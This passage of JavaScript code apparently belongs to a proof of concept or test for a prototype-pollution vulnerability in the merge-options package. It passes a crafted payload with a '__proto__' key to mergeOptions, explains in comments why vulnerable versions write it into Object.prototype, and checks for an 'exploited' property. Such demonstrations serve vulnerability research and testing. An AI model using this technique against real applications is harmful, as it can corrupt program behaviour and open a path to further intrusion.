        configurable: true,
        writable: true
    });

    // 3. Trigger the vulnerability.
    // In vulnerable versions, merge-options iterates over all keys in the source 
    // objects without validating for dangerous prototype chain keys. It performs 
    // direct assignment: target[key] = source[key]. When key is '__proto__', 
    // this operation mutates the object's internal prototype slot.
    mergeOptions({}, payload);

    // 4. Verify pollution occurred directly on Object.prototype
    if (Object.prototype.hasOwnProperty.call(Object.prototype, 'exploited')) {
